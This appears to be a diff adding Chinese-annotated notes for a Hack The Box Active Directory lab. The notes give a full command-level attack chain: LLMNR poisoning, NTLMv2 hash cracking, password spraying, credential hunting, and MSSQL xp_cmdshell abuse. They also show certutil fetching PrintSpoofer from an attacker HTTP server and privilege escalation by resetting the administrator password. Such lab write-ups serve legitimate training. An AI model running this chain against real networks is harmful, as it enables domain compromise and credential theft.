@@ -55,4 +55,46 @@ sudo responder -I ens224 -wrfv
       -r	启用 NetBIOS 名称解析欺骗（高级）
       -f	启用 NBNS 查询欺骗（高级）
       -v	详细输出模式（显示更多信息）
+NTLM 保存在 AB920_ntlmv2
 hashcat -m 5600 AB920_ntlmv2 /usr/share/wordlists/rockyou.txt.gz
+sudo nmap -p 88,445,3389 --open 172.16.7.0/24                  网段扫描更多主机，发现3个
+bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal                  扫描Domain Controller，无攻击路径
+nmap -A 172.16.7.50                  扫描下一个
+xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution                  RDP 登录 MS01 （非 DC）
+wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1            下载工具
+wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe              下载工具
+scp PowerView.ps1 htb-student@STMIP:/home/htb-student/Desktop                        复制到jump-host
+scp kerbrute_windows_amd64.exe htb-student@STMIP:/home/htb-student/Desktop           复制到jump-host
+MS01 上有个一个 jump-host 的 shared drive
+复制工具到 MS01 桌面
+C:\Users\AB920\Desktop> Set-ExecutionPolicy Bypass -Scope Process
+C:\Users\AB920\Desktop> Import-Module .\PowerView.ps1
+C:\Users\AB920\Desktop> Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt      扫描创建 DomainUser 列表文件
+C:\Users\AB920\Desktop> Get-Content .\adusers.txt | select -First 10      看看前10
+C:\Users\AB920\Desktop> .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1            pwd喷洒
+wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe            下载工具
+scp Snaffler.exe htb-student@STMIP:/home/htb-student/Desktop            复制到jump-host
+C:\Users\AB920\Desktop> runas /netonly /user:INLANEFREIGHT\BR086 powershell            用另外一个用户 BR086 运行 powershell
+cd C:\users\AB920\Desktop
+.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data            对目标域进行敏感数据挖掘，自动扫描并标记出有价值的文件，如密码和配置文件
+mssqlclient.py netdb:D@ta_bAse_adm1n\!@172.16.7.60      用上面的凭证登录 SQL01 （非 DC）
+enable_xp_cmdshell            在 mssql 执行系统命令
+SQL> xp_cmdshell whoami /priv            查看权限，如 SeImpersonatePrivilege
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe            下载工具
+scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop            复制到jump-host
+python3 -m http.server 9000            在 jump-host
+SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe      下载工具
+用 PrintSpoofer.exe 获得系统权限 
+      One option is to catch a reverse shell
+      or, add a new admin user
+      the simplest way forward is simply to change the password for the current local administrator (setting it to Welcome1 in here)
+SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
+登录拿旗
+smbclient -U "administrator" \\\\172.16.7.60\\C$
+cd Users\Administrator\Desktop\
+get flag.txt
+exit
+cat flag.txt
+
+
+
